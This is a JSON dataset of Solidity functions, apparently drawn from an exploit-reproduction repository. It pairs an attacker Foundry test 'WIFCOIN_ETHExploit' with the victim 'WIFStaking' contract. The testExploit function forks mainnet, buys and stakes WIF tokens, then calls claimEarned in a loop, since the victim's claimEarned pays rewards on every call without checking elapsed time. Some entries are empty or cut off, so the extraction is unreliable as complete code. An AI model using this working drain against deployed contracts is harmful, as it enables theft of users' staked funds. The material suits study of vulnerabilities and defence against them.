[
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_103_189);\n        Wif.approve(address(router), type(uint256).max);\n        Wif.approve(address(WifStake), type(uint256).max);\n        fundingToken = address(0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFCOIN_ETHExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        //Paths\n        address[] memory buyPath = new address[](2);\n        buyPath[0] = address(router.WETH()); // weth\n        buyPath[1] = address(Wif); // token\n        address[] memory sellPath = new address[](2);\n        sellPath[0] = buyPath[1];\n        sellPath[1] = buyPath[0];\n\n        //set ethbal to 0.3 eth to buy tokens\n        vm.deal(address(this), ethFlashAmt);\n        router.swapExactETHForTokens{value: ethFlashAmt}(0, buyPath, address(this), block.timestamp);\n\n        WifStake.stake(3, Wif.balanceOf(address(this)));\n        while (true) {\n            try WifStake.claimEarned(3, 10) {}\n            catch {\n                break;\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "claimEarned",
    "original_code": "    function claimEarned(uint256 _stakingId, uint256 _burnRate) public override {\n        require(_burnRate == 10 || _burnRate == 25 || _burnRate == 40, \"Invalid burn rate\");\n\n        uint256 _earned = 0;\n        Plan storage plan = plans[_stakingId];\n\n        require(stakes[_stakingId][msg.sender].length > 0, \"No stakes found\");\n\n        for (uint256 i = 0; i < stakes[_stakingId][msg.sender].length; i++) {\n            Staking storage _staking = stakes[_stakingId][msg.sender][i];\n            _earned = _earned.add(\n                _staking\n                    .amount\n                    .mul(plan.apr)\n                    .div(10000)\n            );\n\n            totalRewards = totalRewards.add(_earned);\n            totalRewardsPerPlan[_stakingId] = totalRewardsPerPlan[_stakingId].add(_earned);\n\n            totalRewardsPerWalletPerPlan[_stakingId][msg.sender] = totalRewardsPerWalletPerPlan[_stakingId][msg.sender].add(_earned);\n\n            totalEarnedRewardsPerWallet[msg.sender] += _earned;\n        \n            _staking.stakeAt = block.timestamp;\n        }\n\n        require(_earned > 0, \"There is no amount to claim\");\n\n        uint256 burnAmount = _earned.mul(_burnRate).div(100);\n        IERC20(stakingToken).transfer(BURN_ADDRESS, burnAmount);\n        IERC20(stakingToken).transfer(msg.sender, _earned.sub(burnAmount));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(uint256 _stakingId, uint256 _amount) public nonReentrant override {\n        require(_amount > 0, \"Staking Amount cannot be zero\");\n        require(IERC20(stakingToken).balanceOf(msg.sender) >= _amount, \"Balance is not enough\");\n        require(_stakingId < planLimit, \"Staking is unavailable\");\n        \n        Plan storage plan = plans[_stakingId];\n        require(!plan.conclude, \"Staking in this pool is concluded\");\n\n        uint256 beforeBalance = IERC20(stakingToken).balanceOf(address(this));\n        IERC20(stakingToken).transferFrom(msg.sender, address(this), _amount);\n        uint256 afterBalance = IERC20(stakingToken).balanceOf(address(this));\n        uint256 amount = afterBalance - beforeBalance;\n        \n        uint256 stakelength = stakes[_stakingId][msg.sender].length;\n        \n        if(stakelength == 0) {\n            plan.stakesCount += 1;\n        }\n\n        stakes[_stakingId][msg.sender].push();\n        \n        Staking storage _staking = stakes[_stakingId][msg.sender][stakelength];\n        _staking.amount = amount;\n        _staking.stakeAt = block.timestamp;\n        _staking.endstakeAt = block.timestamp + plan.stakeDuration;\n        \n        plan.overallStaked = plan.overallStaked.add(amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public pure override returns (uint256) {\n        return _tTotal;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n// File: 0xscan-staking/SafeERC20.sol\n\n\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/utils/SafeERC20.sol)\n\n",
    "description": ""
  },
  {
    "contract/interface": "WIFStaking",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]